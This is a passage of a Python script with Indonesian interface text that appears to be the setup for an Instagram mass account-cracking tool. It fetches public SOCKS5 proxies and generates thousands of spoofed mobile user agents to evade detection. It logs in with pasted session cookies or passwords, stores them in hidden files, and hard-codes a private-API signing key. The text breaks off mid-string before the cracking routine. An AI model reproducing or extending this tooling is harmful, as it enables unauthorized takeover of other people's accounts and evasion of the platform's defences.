
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import urllib.parse
	import calendar
	import base64,subprocess
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
from rich.panel import Panel as Idin_gg
from rich import print as Idin_Panel

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#afafff]"
	color_table = "#9F9F9F"
sys.stdout.write('\x1b]2; IG || MULTI PLER\x07')
try:
	os.mkdir('result')
except:
	pass
try:os.mkdir("assets")
except:pass
P = '\x1b[1;97m'
M = '\x1b[1;91m'
HI = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
J = '\x1b[0m'
Z = "\033[1;30m"
SE = "[#9F9F9F]" # ABU
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
WR = random.choice([H2,U2])
acakrich=random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
hapus  = '[/]'
zx=[]
try:
	link = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
	open('.prox.txt','w').write(link)
except:pass
try:
	from cleantext import clean
except:
	os.system("pip3 install clean-text")
	os.system("pip3 install Unidecode")
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
B = '\x1b[1;94m' #BIRU#
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 440dpi; 1080x2276; Xiaomi/Redmi; 21091116UG; pissarropro; mt6877; en_US; 556277190)"
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone12,1; iOS 15_5; fr_FR; fr-FR; scale=2.00; 828x1792; 382468104)"
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone10,5; iOS 11_3; en_DE; en-GB; scale=2.61; gamut=wide; 1080x1920)"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
HARIS1={}
method=[]
ugen=[]
s=requests.Session()
zx=[]
baru=[]
ncek=[]
til = "ncek"
############UA#############
ugen5=[]
def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3]))
    baru.append(uainsta)

for typo in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 8.1.0; Gravity_5_GO Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.143 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (Linux; Android 12; MP08 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; TECNO Mobile KI8 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.175 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazstart = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5]))
    baru.append(uazstart)

for NazriXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   adtyaUAmain = rc([ugent1,ugent2,ugent3])
   ugen.append(adtyaUAmain)
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def banner():
	clear()
	au=f"""

$$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ 
$$ |  $$ |$$  __$$\ $$  __$$\ $$ | $$  |
$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / 
$$$$$$$$ |$$$$$$$$ |$$ |      $$$$$  /  
$$  __$$ |$$  __$$ |$$ |      $$  $$<   
$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
$$ |  $$ |$$ |  $$ |\$$$$$$  |$$ | \$$\ 
\__|  \__|\__|  \__| \______/ \__|  \__|
                                        
                                        
                                        
$$$$$$\  $$$$$$\  $$$$$$$$\ $$\         
\_$$  _|$$  __$$\ $$  _____|$$ |        
  $$ |  $$ /  \__|$$ |      $$ |        
  $$ |  $$ |$$$$\ $$$$$\    $$ |        
  $$ |  $$ |\_$$ |$$  __|   $$ |        
  $$ |  $$ |  $$ |$$ |      $$ |        
$$$$$$\ \$$$$$$  |$$$$$$$$\ $$$$$$$$\   
\______| \______/ \________|\________|                                       

RAKITAN UPDATE 2025 FIIXD                                        
                                        
"""
	sol().print(nel(au,style=f'bold green',title=f'{M2}{waktu()}'))
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus
def li():
    clear()
    up=f"""[green]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                            [/green]"""
    ui=nel(up,style='green')
    sol().print(ui)	
def lu():
	clear()
	up=f"""[red]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                   [/red]
"""
	sol().print(nel(up, style=''))
def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='• Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user
def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f'\t           {P2}Login menggunakan cookie instagram[/]',padding=(0,2),style=f"{color_table}"))
            coki = input(f"• Masukan Cookie : {H}")
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] cookie kamu valid", padding=(0,5), style=f"{color_table}", width=80));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] Jalankan ulang perintah nya")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(4)
                exit(f'{M} [x] Login gagal silahkan cek akun tumbal anda');time.sleep(8)
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:register_device()
def login():
	global external
	try:
		wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		us=input(f"{N}[•] Masukan username: {N}")
		pw=stdiomask.getpass(prompt=f'{N}[•] Masukan password: {N}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt terdeteksi... keluar !'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} Login berhasil')
		os.system('python run.py')
	elif x.get('status')=='checkpoint':
		wel = '# Login checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
	else:
		wel = '# Username atau password yang anda masukan salah'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent
def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)
def user_agentAPI():
	APP_VERSION = "269.0.0.18.75"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; in_ID)"
	return USER_AGENT_BASE	
class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_hea